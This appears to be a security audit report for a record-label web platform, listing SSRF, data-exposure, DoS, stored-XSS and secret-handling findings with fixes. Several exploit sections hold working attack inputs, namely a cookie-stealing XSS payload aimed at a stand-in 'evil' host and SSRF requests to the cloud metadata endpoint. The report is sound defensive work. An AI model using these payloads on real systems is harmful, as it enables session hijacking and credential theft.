# Backend Security Audit Report — Record-Label Platform (Next.js 15 / Prisma / MongoDB)

**Date:** 2026-07-01
**Scope:** Backend API surface (`/api/*`), auth/authz layer, S3 upload flows, analytics ingest, SEO/JSON-LD output rendering, and supporting libraries (`lib/s3.ts`, `lib/auth-*`, `lib/fuzzy.ts`, `lib/seo.ts`, `lib/rate-limit.ts`, `lib/url-safety.ts`).
**Methodology:** Three independent adversarial reviewers; only findings affirmed by ≥2 of 3 are reported below.

---

## 0. Remediation Status (updated 2026-07-01)

All 25 confirmed findings were addressed. Verified with 31/31 unit checks against the
real source (SSRF IP-blocking, fuzzy caps, JSON-LD escaper, CSRF logic) plus live
read-only checks on the running app (security headers, masked endpoint, search
rate-limit returning 429 after 30 req/min, valid escaped JSON-LD). Typecheck + lint clean.

| Finding | Status | Where |
|---|---|---|
| M-1/M-2/M-3 SSRF | ✅ Fixed | `lib/s3.ts` `safeImageFetch` (DNS/IP block, port limit, manual redirect re-validation); `isSafeUrl` on artist `profilePicture` |
| M-4 / L-7 data exposure | ✅ Fixed | `app/api/artists/[artistId]/releases/route.ts` — masks private fields + draft-artist 404 for non-admins |
| M-5 / L-2 / L-9 / L-12 search DoS | ✅ Fixed | `lib/fuzzy.ts` needle/haystack caps; `q` capped + per-IP rate limit in releases/artists routes |
| M-6 analytics integrity | ✅ Fixed | `track-play` verifies content exists & is public; ignores client `completed` on create |
| M-7 stored XSS (JSON-LD) | ✅ Fixed | `jsonLdScript()` in `lib/seo.ts`, applied at all 8 injection sites |
| M-8 / L-14 ingest secret | ✅ Fixed | dedicated `ERROR_LOG_INGEST_SECRET` only (no NEXTAUTH fallback) + `timingSafeEqual` |
| L-1 / L-5 presign authz/type | ✅ Fixed | `requireAdmin` (revocation-aware), audio-type enforced for all, SVG rejected, admin rate-limited |
| L-4 / L-8 / L-10 remix flow | ✅ Fixed | HeadObject fails **closed**, `releaseName` capped, upload routes rate-limited |
| L-11 / L-13 play-event | ✅ Fixed | rate-limited, duration clamped 0–24h, `completed` one-way |
| L-3 / I-1 SSRF/SVG rehost | ✅ Fixed | folded into the `lib/s3.ts` rewrite (SVG rejected, stored ContentType from validated map) |
| L-15 security headers | ✅ N/A | already set site-wide in `next.config.ts` `headers()` — recon lead was a false positive |
| I-2 rate-limiter store | ⚠️ Deferred | needs a shared store (e.g. Upstash Redis) — infrastructure, not code |
| L-6 presign size cap | ⚠️ Deferred | needs PUT→POST-policy `content-length-range` migration + client change (untestable vs prod S3). L-4 fail-closed HeadObject enforces the 200 MB cap for the competition flow in the meantime |
| L-15 CSP `'unsafe-inline'` | ⚠️ Deferred | removing it needs a nonce-everywhere migration that breaks SSG; **M-7 (the actual XSS sink) is fixed**, which is the real mitigation |

**Operator actions required before this is fully effective in production:**
1. Set a dedicated `ERROR_LOG_INGEST_SECRET` (`openssl rand -base64 32`). Without it, server error reports still send but are treated as rate-limited client reports.
2. Ensure the app's S3 IAM role is granted `s3:HeadObject` (upload-complete now fails closed on a HEAD error).

---

## 1. Executive Summary

The application demonstrates a **mostly sound authorization architecture** — a deliberate "every sensitive API route self-guards" model backed by a DB-revocation-aware `requireAdmin`, path-traversal-safe S3 key handling, ownership-scoped analytics mutations, and React-escaped output on most rendered surfaces. There are **no Critical or High findings**: there is no unauthenticated privilege escalation, no direct IDOR on user-owned resources, and no raw NoSQL injection sink reachable with attacker-controlled operators.

The residual risk concentrates in four themes:

1. **Server-Side Request Forgery (SSRF)** — `rehostExternalImage` in `lib/s3.ts` is an outbound-fetch sink with no private-range/metadata blocking, reachable from three admin write paths (artists, press). The `isSafeUrl` gate provides only scheme filtering and gives a false sense of SSRF protection.
2. **Information disclosure** — one public endpoint (`/api/artists/[artistId]/releases`) serializes raw Prisma `Release` rows, leaking internal catalogue/rights metadata (UPC, catalogue number, ℗/© lines, ISRC) that every sibling endpoint deliberately masks.
3. **Denial-of-service / CPU amplification** — unauthenticated, unrated fuzzy-search endpoints load full collections and run O(n·m) edit-distance scoring against an uncapped query string, defeating the CDN via cache-busting.
4. **Stored XSS via JSON-LD breakout** — admin-authored names/descriptions are embedded into `<script type="application/ld+json">` via unescaped `JSON.stringify`, allowing a `</script>` breakout that executes in every public visitor's browser.

Supporting weaknesses in analytics-metric integrity, upload size/type constraints, and secrets configuration (notably `NEXTAUTH_SECRET` reuse as an ingest bearer transmitted in a plaintext header) round out the medium/low set.

### Severity Counts

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 0 |
| Medium | 8 |
| Low | 15 |
| Informational | 2 |
| **Total** | **25** |

---

## 2. Findings

### MEDIUM

---

#### M-1. SSRF: `rehostExternalImage` fetches arbitrary admin-supplied URLs with no host/IP allowlist or private-range blocking
**File:** `lib/s3.ts:105-138`
**Dimension:** SSRF

**What / Why:** `rehostExternalImage(url, ...)` is a server-side outbound fetch sink whose only gate on the target is `/^https?:\/\//i.test(url)` (line 112) plus an `isOwnBucketUrl` short-circuit (line 110). It then calls `fetch(url, { redirect: 'follow' })` (line 115) with **no** host allowlist, **no** DNS/IP resolution, and **no** block on loopback (`127.0.0.1`/`localhost`/`[::1]`), RFC1918 (`10.`/`172.16.`/`192.168.`), link-local (`169.254.0.0/16`), or the cloud metadata endpoint (`169.254.169.254`). Because it follows redirects, even an allowlisted host could `302` into an internal address. The response is only *stored* if content-type is `image/*` and size ≤ 15 MB — but the SSRF connection itself always occurs, and a small internal response served with an `image/*` header can be rehosted into the public S3 bucket for exfiltration. The docstring implies a trusted `i.scdn.co` input, but callers pass raw admin-supplied strings.

**Exploit:** An authenticated admin (or a holder of a stolen/forged admin JWT, or a CSRF-forced request against a logged-in admin) submits `POST /api/artists` with `profilePicture: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"`. The server fetches the metadata service from inside the VPC. The same primitive maps internal services (`http://localhost:3000/`, `http://10.0.0.5:6379/`) by timing/success oracle, or rehosts an internal image-typed response into the public bucket.

**Remediation:** Before fetching, resolve the hostname and reject any URL whose resolved IP(s) fall in loopback/private/link-local/reserved ranges (including `169.254.169.254`); reject non-default ports; and either set `redirect: 'error'` or re-validate the final URL after each hop with a DNS-pinned SSRF-safe agent. Prefer a positive allowlist of known image CDNs (`i.scdn.co`, `image-cdn-ak.spotifycdn.com`, `i.ytimg.com`). Enforce a fetch timeout. Centralize this in the sink so no caller can bypass it.

---

#### M-2. Artist create/update pass `profilePicture` into the SSRF sink with no URL validation at all
**File:** `app/api/artists/route.ts:169-171` (POST); `app/api/artists/[artistId]/route.ts:127-129` (PUT)
**Dimension:** SSRF

**What / Why:** Both handlers take the raw `body.profilePicture` string and pass it directly into `rehostExternalImage` with **zero** validation — not even `isSafeUrl`. Unlike the press route (which at least runs `isSafeUrl` first), the artist routes apply no scheme/host filtering. This is the most direct trigger of the M-1 sink.

**Exploit:** `PUT /api/artists/<id>` with `{"name":"x","biography":"x","profilePicture":"http://169.254.169.254/latest/meta-data/"}` (or `http://localhost:6379/`, `http://10.x.x.x/`) issues the request from inside the network. With redirect-follow in the sink, an external attacker-controlled URL can `302` into an internal address.

**Remediation:** Gate `profilePicture` through the SSRF-safe validator (private-range/metadata rejection + optional CDN allowlist) before calling `rehostExternalImage` in both handlers. Centralizing the check inside `rehostExternalImage` (per M-1) covers both.

---

#### M-3. Press image rehosting reaches the SSRF sink through `extractPressInput`
**File:** `app/api/press/[pressId]/route.ts:86-88` (PUT); `app/api/press/route.ts:106-108` (POST)
**Dimension:** SSRF

**What / Why:** Both press handlers call `rehostExternalImage(input.image, ...)`. `input.image` is only validated by `isSafeUrl` + an `http(s)` regex (via `lib/press-input.ts` `cleanImage`), which does not block internal targets. These `requireAdmin`-gated handlers are additional entry points into the sink. Admin gating limits the attacker to a valid/compromised admin session, hence Medium.

**Exploit:** An admin (or forged/leaked admin token) `PUT`s a press item with `image` set to `http://169.254.169.254/...`, or an external attacker-controlled URL that redirects to an internal host; the server performs the internal fetch during rehosting.

**Remediation:** Apply SSRF-safe fetch hardening centrally in `rehostExternalImage` so both press handlers are covered; optionally restrict press images to known article-image CDNs.

---

#### M-4. Public artist-releases endpoint returns full `Release` rows, leaking private distribution/rights metadata
**File:** `app/api/artists/[artistId]/releases/route.ts:16-33`
**Dimension:** Information exposure

**What / Why:** `GET /api/artists/[artistId]/releases` is completely unauthenticated (no `requireAdmin`/`isAdminRequest` anywhere). It runs `prisma.release.findMany` with **no `select`** (only `include: { tracks: { select: { id: true } } }`) and returns the raw rows via `NextResponse.json(releases)`. The `Release` model (`prisma/schema.prisma:175-235`) includes internal-only fields the rest of the codebase deliberately masks: `upcCode`, `catalogueNumber` (marked *Internal*), `pLine` (℗), `cLine` (©), `isrcCode`, `composer`, `lyricist`, `leadVocal`, plus internal ordering fields. The sibling `GET /api/releases/[releaseId]` (`route.ts:85-88`) explicitly returns `upcCode: isAdmin ? release.upcCode : null` (and same for catalogue/℗/©), and `lib/catalog-data.ts` (`mapReleasesToCards`, line 199) never emits these to non-admins. `publicReleaseWhere()` correctly limits results to *live* releases, so drafts are not leaked — but every live release's private metadata is exposed to anonymous callers.

**Exploit:** Anonymous `GET /api/artists/<artistId>/releases` (no cookies) returns, per live release, the raw row including `upcCode`, `catalogueNumber`, `pLine`, `cLine`, `isrcCode`, `composer`, `lyricist`, `leadVocal`. Iterating public artist IDs harvests the label's entire UPC/catalogue scheme and rights lines.

**Remediation:** Reuse the shared public shaper: load with `releaseCardListArgs` and return `mapReleasesToCards(rows, { isAdmin: false })`, or add an explicit `select` limited to public-safe fields. If admin callers need full rows here, gate the extra fields behind `isAdminRequest(request)` exactly as `/api/releases/[releaseId]` does.

---

#### M-5. Unauthenticated `/api/releases?q=` fuzzy search: full-collection load + O(n·m) scoring, no rate limit, no query cap
**File:** `app/api/releases/route.ts:78-107`
**Dimension:** DoS

**What / Why:** The public GET branch is `force-dynamic`, has **no** rate limiting, and when `?q=` is present it (a) loads **every** artist and **every** release into memory on each request, then (b) runs `fuzzyScore` (→ `substringEditDistance`, Sellers O(needle·haystack)) against each name and every `featureArtistName`. Neither the needle nor the target is length-capped (`lib/fuzzy.ts`), and `qParam` is only `.trim()`ed (line 58). The response is CDN-cacheable (`public, s-maxage=60`) but the cache key includes the query string, so a unique `?q=` per request bypasses the cache and forces the DB read + full in-JS scan every time.

**Exploit:** Anonymous flood of `GET /api/releases?q=<8000-char string>&_=<nonce>` — each request runs `findMany` over all artists + all releases plus edit-distance scoring with an 8000-char needle against every name. A few hundred concurrent requests pin CPU and hammer MongoDB with full-collection reads.

**Remediation:** Add `rateLimit(\`releasessearch:${clientIp(request)}\`, ...)`; cap `qParam.slice(0,64)` before scoring; push search into a DB text/escaped-regex query with `take`; and add a needle-length guard inside `fuzzyScore`/`substringEditDistance` as defense-in-depth.

---

#### M-6. `track-play` accepts arbitrary `completed`/`duration` for any ObjectId-shaped `contentId` (analytics-metric poisoning)
**File:** `app/api/analytics/track-play/route.ts:53-114`
**Dimension:** Business logic

**What / Why:** `POST /api/analytics/track-play` validates `contentId` only as a 24-hex ObjectId (`OBJECT_ID.test`) and never confirms the referenced release/track exists or is public. `contentName`, `artistName`, `playDuration`, and `completed` are taken straight from the body (`completed === true` and a clamped-but-caller-chosen `playDuration`). Each accepted call creates one `PlayEvent`. The dashboard derives `completedPlays`, `completionRate`, and per-content totals directly from these rows (`dashboard/route.ts:110,182,194,306-307`).

**Exploit:** After accepting the analytics cookie once (or scripting the consent/visitor cookies), loop POSTs with `{contentType:'track', contentId:'<24 hex of a target release>', playDuration:200, completed:true}`. The in-memory limiter is per-process and IP-keyed (spoofable via `x-real-ip`/`x-forwarded-for`, reset across serverless instances), so the effective cap far exceeds 120/min. The dashboard's play counts, completion rate, and "top content" rankings are inflated with fabricated completed plays.

**Remediation:** Verify `contentId` references an existing, publicly-visible release/track (`findUnique` with `publicReleaseWhere` gating) before creating a `PlayEvent`. Do not trust `completed` on create (record `false`; only allow the finalize `PATCH` to mark completion). Dedupe plays per `(visitorId/userId, contentId, session)` window and back the limiter with a shared store.

---

#### M-7. JSON-LD injection / stored XSS: stored names/descriptions injected into `<script type="application/ld+json">` via unescaped `JSON.stringify`
**File:** `app/(main)/artists/[artistId]/page.tsx:118,122`; `app/(main)/releases/[releaseId]/layout.tsx:90,95`; `lib/seo.ts:137,150,203,216,256`
**Dimension:** XSS (output)

**What / Why:** Every JSON-LD block is emitted as `<script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }} />`. `JSON.stringify` does **not** HTML-escape `<`, `>`, `&`, or `/`, and the output is written raw into the DOM. The JSON embeds stored, admin-authored free text: `artist.name` (`seo.ts:137`), biography via `metaDescription` (`seo.ts:150`), `release.name` (`seo.ts:203`), `release.description` (`seo.ts:216`), and breadcrumb names (`seo.ts:256`, `layout.tsx:99`, `page.tsx:98`). Any field containing `</script>` terminates the JSON-LD element early; the browser then parses the following bytes as live markup. No input extractor strips or encodes angle brackets — they only length-cap.

**Exploit:** An admin (or a stolen/CSRF'd admin token — write routes are `requireAdmin` but have no CSRF token) sets an artist biography or release description to `</script><script>fetch('https://evil/?c='+document.cookie)</script>`. It is stored verbatim. When any anonymous visitor loads `/artists/<slug>` or `/releases/<slug>`, the first `</script>` closes the `ld+json` block and the injected `<script>` runs in the visitor's session on the site origin — full stored XSS. Same via `artist.name`, `release.name`, and press title (`buildPressListJsonLd`, `app/(main)/press/page.tsx:38` → `seo.ts:395`).

**Remediation:** Do not hand raw `JSON.stringify` output to `dangerouslySetInnerHTML`. Centralize a `jsonLdScript(obj)` helper that escapes breakout characters:
```
JSON.stringify(x).replace(/</g,'\\u003c').replace(/>/g,'\\u003e')
  .replace(/&/g,'\\u0026').replace(/\u2028/g,'\\u2028').replace(/\u2029/g,'\\u2029')
```
Use it at all sites (`artists page.tsx:118/122`, `releases layout.tsx:90/95`, `press page.tsx:38`, `app/page.tsx:58/64`, `about page.tsx:28`). The `<` replacement alone neutralizes the `</script>` breakout while keeping JSON valid for crawlers. Defense-in-depth: also strip angle brackets in the input extractors.

---

#### M-8. `NEXTAUTH_SECRET` reused as the error-log ingest bearer token (no dedicated secret configured)
**File:** `app/api/error-log/route.ts:15-16`
**Dimension:** Secrets / configuration

**What / Why:** The trusted-ingest decision falls back to `NEXTAUTH_SECRET` when `ERROR_LOG_INGEST_SECRET` is unset: `const internalSecret = process.env.ERROR_LOG_INGEST_SECRET || process.env.NEXTAUTH_SECRET`. `instrumentation.ts:27` does the same fallback and sends that value in the plaintext `x-error-source` header on every server-side error report. The live `.env` has **no** `ERROR_LOG_INGEST_SECRET`, so the fallback is **active**: the secret that signs/encrypts all NextAuth session JWTs now travels in HTTP headers (captured by any proxy/CDN/APM log) and is compared in a request handler.

**Exploit:** An attacker who obtains the `x-error-source` value from any log aggregator, reverse proxy, or misrouted report gains `NEXTAUTH_SECRET`. With it they can mint a valid `role='admin'` session JWT and authenticate to every `requireAdmin` route — exfiltrating subscriber/analytics PII and mutating the catalog. They can also post trusted `source="server"` error rows bypassing the rate limit.

**Remediation:** Require a dedicated `ERROR_LOG_INGEST_SECRET` with **no** fallback to `NEXTAUTH_SECRET`; if unset, treat all ingest as untrusted (client, rate-limited). Generate it independently (`openssl rand -base64 32`). Never transmit `NEXTAUTH_SECRET` in a request header. (See L-11 for the comparison side-channel.)

---

### LOW

---

#### L-1. Presigned-URL admin branch uses token-only admin check, not DB-revocation-aware `requireAdmin`
**File:** `app/api/upload/presigned-urls/route.ts:29`
**Dimension:** Authorization

**What / Why:** The route guards entry with `requireUser`, then grants the privileged admin upload path via `isAdmin = tokenIsAdmin(guard.token)` — a **token-only** check (`lib/auth-session.ts:26`, `role==='admin'` OR bootstrap email) with no DB re-read. Elsewhere, admin mutations use `requireAdmin` (`lib/auth-guard.ts:39`) which re-reads `User.role` so demotion revokes access on the next request even while the 30-day JWT still says `admin`. The admin branch here grants materially more power: (a) client controls the full S3 object key (only `sanitizeKey` traversal checks apply, so any bucket object can be overwritten), (b) removes the `audio/*` content-type restriction, and (c) **skips** the per-user rate limit (`rateLimit` is only inside the `if (!isAdmin)` block at line 62).

**Exploit:** An owner grants a collaborator `role='admin'`, later revokes them via `PATCH /api/admin/users/[userId] {role:'user'}`. Page/`requireAdmin` access is immediately denied, but the demoted user's still-valid JWT keeps `tokenIsAdmin` true, so `POST /api/upload/presigned-urls` with `{audioFileName:'releases/<victim>/track1.mp3', audioFileType:'audio/mpeg'}` returns a presigned PUT (no rate limit) that overwrites any existing bucket object until the JWT expires.

**Remediation:** Decide the admin branch with `const adminGuard = await requireAdmin(request); const isAdmin = adminGuard.ok;` (keeping `requireUser` for the baseline), matching the sibling `presigned-url-image`/`presigned-urls-bulk` routes. Apply a rate limit to the admin path too.

---

#### L-2. Search `q` parameter has no length cap before O(n·m) fuzzy scoring (CPU amplification)
**File:** `app/api/artists/route.ts:55,99-104`
**Dimension:** Injection / DoS

**What / Why:** The public search branches take `q = (searchParams.get("q")||"").trim()` with no maximum length (`artists/route.ts:55`; `releases/route.ts:58`) and pass it to `fuzzyScore(q, name)` for every row loaded in memory. When `strip(q).length > 8`, `fuzzyScore` calls `substringEditDistance(q, t)`, O(|q|·|t|) (`lib/fuzzy.ts:14-29,41-44`). No regex is built from `q` and the strip regex is linear, so this is **not** ReDoS — but an unauthenticated caller can send a multi-megabyte `q` scored against every candidate, and `force-dynamic` + unique query strings defeat the CDN.

**Exploit:** Loop `GET /api/releases?q=<200KB of 'a'>&_=<random>` — each forces a full `release.findMany` + `artist.findMany` then O(|q|·|name|) scoring across every row, pinning a worker's CPU.

**Remediation:** Cap before scoring: `const q = (searchParams.get("q")||"").trim().slice(0,100);` in both routes; add a short-circuit in `fuzzyScore` returning 0 when `q.length` is excessive; apply `rateLimit()`/`clientIp()` to the public search branches.

---

#### L-3. `isSafeUrl` does not mitigate SSRF for press image rehosting (allows internal hosts)
**File:** `lib/url-safety.ts:16-21`
**Dimension:** SSRF

**What / Why:** The press routes pass `input.image` through `extractPressInput → cleanImage → isSafeUrl` (`lib/press-input.ts:56-60`) before `rehostExternalImage`, creating a false sense of protection. `isSafeUrl` only checks the scheme is `http:`/`https:` — **no** host/IP validation. So `http://169.254.169.254/x.png`, `http://localhost/x.png`, and `http://10.0.0.1/x.png` all pass and reach the SSRF fetch. `isSafeUrl` is an XSS/scheme gate, not an SSRF gate.

**Exploit:** `POST /api/press` with a valid title/publisher/summary plus `{"image":"http://169.254.169.254/latest/meta-data/"}`; `isSafeUrl` approves it (http scheme) and `rehostExternalImage` fetches the internal endpoint.

**Remediation:** Do not rely on `isSafeUrl` for outbound-fetch safety. Add explicit SSRF filtering (private/loopback/link-local/metadata rejection after DNS resolution, redirect hardening) in `rehostExternalImage`. Keep `isSafeUrl` only for rendered-URL/XSS gating.

---

#### L-4. `upload-complete` size/content-type validation fails **open** on any S3 error
**File:** `app/api/benert-remix/upload-complete/route.ts:78-92`
**Dimension:** Upload

**What / Why:** The HeadObject-based validation (200 MB size cap + audio-only content-type) is wrapped in a try/catch that merely logs a warning and continues on **any** S3 error (lines 89-91). If HeadObject is IAM-denied, throttled, or races the write, both checks are silently skipped and the entry is recorded. Content-type is largely mitigated because the non-admin presign binds `ContentType` to `audio/*` in the signed PUT — but the **size cap has no enforcement anywhere else** (no `content-length-range` on the presigned PUT).

**Exploit:** A competition entrant obtains a presigned PUT for `benert-remix/<theirSub>/song.wav`, PUTs a multi-gigabyte file to their own prefix, then calls `upload-complete`. If HeadObject errors, the size check is skipped and the oversized object is registered.

**Remediation:** Enforce the size cap at presign time with a signed `content-length-range` condition (or POST policy). On HeadObject failure, fail **closed** (reject and ask the client to retry). Ensure the app's IAM role reliably has `s3:HeadObject`.

---

#### L-5. Admin audio presign accepts arbitrary key + arbitrary content-type, enabling HTML/SVG upload to the public bucket
**File:** `app/api/upload/presigned-urls/route.ts:54-95`
**Dimension:** Upload

**What / Why:** On the admin branch, `audioKey` is the client's full `sanitizeKey`'d path (line 54) and the presigned PUT's `ContentType` is the client-supplied `audioFileType` with **no** content-type validation (the `isAudioContentType` check at line 66 is only inside `!isAdmin`). `sanitizeKey` blocks traversal but permits any extension/prefix. Since the presigned PUT binds whatever `ContentType` is sent, an admin can mint a URL that writes `evil.html` with `text/html` (or `image/svg+xml`). The bucket serves objects publicly, so `text/html`/`svg+xml` executes script under the bucket origin. Within the admin trust boundary (hence Low) but inconsistent with non-admins' strict `audio/*` confinement.

**Exploit:** A compromised/malicious admin token POSTs `{audioFileName:'promo.html', audioFileType:'text/html'}`, PUTs an HTML payload, and shares the public bucket URL; visitors execute attacker JS under the storage origin.

**Remediation:** Validate `isAudioContentType(audioFileType)` on the admin branch too. For admin image presign routes, reject `image/svg+xml`. Set `ContentDisposition:'attachment'` and serve the bucket via a CDN with `X-Content-Type-Options: nosniff` and a locked-down type allowlist.

---

#### L-6. No `content-length-range` condition on any presigned PUT — uploads have no server-enforced size ceiling
**File:** `app/api/upload/presigned-urls/route.ts:87-95`
**Dimension:** Upload

**What / Why:** None of the presigned PUT commands (`presigned-urls` audio, `presigned-urls-bulk` audio/image, `presigned-url-image`) include a signed size condition, so the holder can PUT any object up to S3's 5 GB single-PUT limit. The competition flow's only guard is the fail-open HeadObject check (L-4); admin flows have no size guard. Combined with the publicly-served bucket, this is a storage/cost-abuse surface.

**Exploit:** Any presigned-URL holder PUTs a maximally-sized object, incurring storage/bandwidth cost; for the competition flow the oversized object may also be recorded if HeadObject fails open.

**Remediation:** Add a signed size constraint — a POST policy with `content-length-range`, or an intended `Content-Length` signed header — so S3 rejects oversized objects without relying on post-hoc HeadObject.

---

#### L-7. Public artist-releases endpoint does not exclude releases linked only via a DRAFT/hidden artist context
**File:** `app/api/artists/[artistId]/releases/route.ts:9-33`
**Dimension:** Information exposure

**What / Why:** The handler accepts any `artistId` and returns that artist's live releases with **no** check that the artist is public (`showOnWebsite`/`draft===false`). The public artist page (`getArtistDetail`, `lib/catalog-data.ts:332`) 404s a draft artist, but this endpoint has no such gate: with a draft/hidden artist's ObjectId, an anonymous caller can enumerate live releases referencing that not-yet-public artist (including via `featureArtistIds`).

**Exploit:** `GET /api/artists/<draftArtistId>/releases` (unauthenticated) returns live releases crediting the hidden artist, revealing an unannounced act's involvement in already-released tracks.

**Remediation:** Load the artist first and return 404 when `!artist || artist.draft || !artist.showOnWebsite` for non-admin callers, mirroring `getArtistDetail`; or route both paths through the same helper so the visibility gate cannot drift.

---

#### L-8. `upload-complete` stores entrant-controlled `releaseName` with only `trim` (no length cap)
**File:** `app/api/benert-remix/upload-complete/route.ts:94-136`
**Dimension:** Validation

**What / Why:** `releaseName` is taken from the body with only `typeof === 'string' ? .trim()` and a non-empty check (lines 94-100). There is no maximum length, unlike the analytics beacons (`contentName.slice(0,300)`, `contextName.slice(0,200)`). Any signed-in entrant can store an arbitrarily large string, later returned verbatim to the admin submissions view via `/api/benert-remix/admin`. React escapes on render, so this is not stored XSS by itself, but it bloats the row/response.

**Exploit:** A signed-in entrant POSTs a valid own-prefix `fileURL` with a multi-megabyte `releaseName`; it is stored unbounded and shipped to the admin list on every load.

**Remediation:** Cap `releaseName.trim().slice(0,200)` before the non-empty check, consistent with the analytics beacons.

---

#### L-9. Unauthenticated `/api/artists?q=` fuzzy search: full roster load + uncapped-query scoring, no rate limit
**File:** `app/api/artists/route.ts:71-106`
**Dimension:** DoS

**What / Why:** The legacy/public bare-array branch is `force-dynamic` and unrated. It always runs `prisma.artist.findMany` selecting ~20 fields for the entire roster, then when `?q=` is set scores every artist via `fuzzyScore` with no cap on `q` (line 55 is `.trim()` only). Same CPU-amplification primitive as M-5 over a single collection; CDN-cacheable but the cache key varies by query string.

**Exploit:** `GET /api/artists?q=<long string>&_=<nonce>` repeatedly forces a full-roster read + O(q·name) scoring, bypassing the CDN via the nonce.

**Remediation:** Rate-limit by `clientIp`, cap `q.slice(0,64)` before scoring, and add a max-needle guard in `lib/fuzzy.ts`.

---

#### L-10. `benert-remix` `upload-url` / `upload-complete` auto-create `User` rows and are not rate-limited
**File:** `app/api/benert-remix/upload-url/route.ts:25-33`; `app/api/benert-remix/upload-complete/route.ts:36-44`
**Dimension:** DoS

**What / Why:** Both routes call `prisma.user.create` when no user exists for the token email, and neither applies `rateLimit` (only the separate presign route throttles, and only non-admins there). A valid session can be replayed to churn work; `upload-complete` additionally does a HeadObject S3 call plus multiple DB reads/writes per request with no throttle.

**Exploit:** A holder of any valid session repeatedly POSTs to both routes; each performs user lookup/create + competition read (+ HeadObject and entry upsert on `upload-complete`) with no per-user limit.

**Remediation:** Add `rateLimit` keyed by `token.sub` to both routes (mirroring `presign:20/60s`) and gate user auto-creation behind that limit.

---

#### L-11. `play-event` finalize PATCH beacon is not rate-limited unlike sibling analytics beacons
**File:** `app/api/analytics/play-event/[id]/route.ts:12-16`
**Dimension:** DoS

**What / Why:** The sibling POST beacons (pageview 240/60s, track-play 120/60s, link-click 120/60s) all rate-limit per IP, but the PATCH finalize handler has no `rateLimit()`. Updates are ownership-scoped (`where {id,userId}|{id,visitorId}`), so abuse is confined to the caller's own events, but the missing limiter lets a caller hammer `prisma.playEvent.update` unthrottled.

**Exploit:** A consented visitor fires `PATCH /api/analytics/play-event/<own-id>` in a tight loop; each does a scoped `update` with no per-IP throttle.

**Remediation:** Add `rateLimit(\`playevent:${clientIp(request)}\`, ...)` consistent with the other analytics beacons.

---

#### L-12. `fuzzyScore` / `substringEditDistance` has no needle-length cap (CPU DoS primitive)
**File:** `lib/fuzzy.ts:14-45`
**Dimension:** DoS

**What / Why:** `substringEditDistance` is O(needle·haystack) and allocates arrays of length `haystack+1` for each needle row. `fuzzyScore` does not cap the query (needle) length, delegating that to callers — and the public search callers (M-5, L-9) do **not** cap `q`. This is the shared amplifier behind both public-search findings.

**Exploit:** Any caller passing an unbounded query (public `/api/releases?q=`, `/api/artists?q=`) scores each candidate with a huge needle, multiplying CPU per row.

**Remediation:** Cap the needle inside `fuzzyScore` (e.g. `const q = strip(query).slice(0,64)`) and/or short-circuit `substringEditDistance` when needle length exceeds a threshold, so no caller can be tricked into an oversized scan.

---

#### L-13. `play-event` finalize PATCH stores unclamped client `playDuration` and lets caller flip `completed` on their own events
**File:** `app/api/analytics/play-event/[id]/route.ts:27-44`
**Dimension:** Business logic

**What / Why:** The PATCH handler builds `data` from the body with `typeof playDuration === 'number' && playDuration > 0` and `typeof completed === 'boolean'`, applying **no** upper clamp (unlike track-play's `0..86_400`). The update is ownership-scoped, so a caller can only mutate their own `PlayEvent` rows — but they can set `playDuration` to any large positive number and `completed=true` on a play never actually completed. These feed the dashboard's `completedPlays`/`completionRate` and listen-duration stats.

**Exploit:** A consented visitor records a `PlayEvent` id (via track-play), then PATCHes `{completed:true, playDuration:999999999}`, skewing average-listen and completion metrics. Repeatable per event with no rate limit on this route.

**Remediation:** Clamp `playDuration` to `0..86_400` before persisting; add a `rateLimit()` (see L-11); optionally permit `completed` only to transition `false→true` once and ignore durations implausibly large relative to content length.

---

#### L-14. Non-constant-time comparison of the error-log ingest secret (timing side channel)
**File:** `app/api/error-log/route.ts:16`
**Dimension:** Secrets / configuration

**What / Why:** The trusted check uses plain JS string equality: `request.headers.get("x-error-source") === internalSecret`. `===` short-circuits on the first differing byte and is not timing-safe. Because `internalSecret` is (in this deployment) `NEXTAUTH_SECRET` (M-8), a timing oracle here targets the session-signing secret. No `crypto.timingSafeEqual` is used anywhere in the codebase.

**Exploit:** An attacker sends many `/api/error-log` requests varying `x-error-source`, measuring latency to recover the secret byte-by-byte. Network jitter makes this hard (hence Low), but the recovered value is high-value.

**Remediation:** Require both lengths equal, then `crypto.timingSafeEqual(Buffer.from(header), Buffer.from(internalSecret))`. Combine with the dedicated-secret fix (M-8) so a leak/oracle does not expose the auth secret.

---

#### L-15. Public CSP allows `'unsafe-inline'` scripts and broad `https:` sources, weakening XSS defense on all non-admin pages
**File:** `middleware.ts:22,28-33`
**Dimension:** Secrets / configuration

**What / Why:** `buildCsp()` for every non-`/admin` route (all public pages, the entire `/api` surface, and `/benert-remix/admin`) emits `script-src 'self' 'unsafe-inline'` (line 22), plus `img-src 'self' data: blob: https:`, `media-src 'self' blob: https:`, and `connect-src 'self' https:` (lines 28,29,33). `'unsafe-inline'` on `script-src` means the CSP provides essentially no defense against the confirmed JSON-LD stored-XSS sink (M-7) or any DOM/reflected XSS on public pages. Broad `https:` in `connect/img/media-src` also permits exfiltration to any HTTPS host. The strict nonce + `strict-dynamic` policy is correctly applied **only** to `/admin`.

**Exploit:** If any stored-content sink (e.g. M-7) yields script execution on a public page, the CSP will not block the injected script, and `connect-src https:` lets it beacon session/analytics data to an attacker-controlled endpoint.

**Remediation:** Extend the nonce-based strict CSP (already built for `/admin`) to public pages, or at minimum drop `'unsafe-inline'` from `script-src` and tighten `connect-src`/`img-src`/`media-src` to an explicit allowlist (self + S3 host + Google/Spotify) instead of blanket `https:`.

---

### INFORMATIONAL

---

#### I-1. `rehostExternalImage` stores images from arbitrary URLs into the public bucket without SVG/type hardening
**File:** `lib/s3.ts:105-138`
**Dimension:** Upload

**What / Why:** `rehostExternalImage` re-uploads fetched bytes into the public bucket, accepting any content-type matching `/^image\//` (`isImageContentType`) — which includes `image/svg+xml`. If the fetched resource reports `image/svg+xml`, the SVG bytes are stored and served publicly with that content-type (`EXT_BY_TYPE` has no svg entry, so ext defaults to `jpg`, but the stored `ContentType` echoes the remote value at line 130). An SVG served as `image/svg+xml` and navigated to directly can execute script. (The SSRF angle of fetching arbitrary URLs is M-1; this note is the stored-active-content angle.)

**Exploit:** An admin import path passes a URL returning `Content-Type: image/svg+xml` with an embedded `<script>`; the SVG is stored and, if navigated directly, its script runs under the bucket origin.

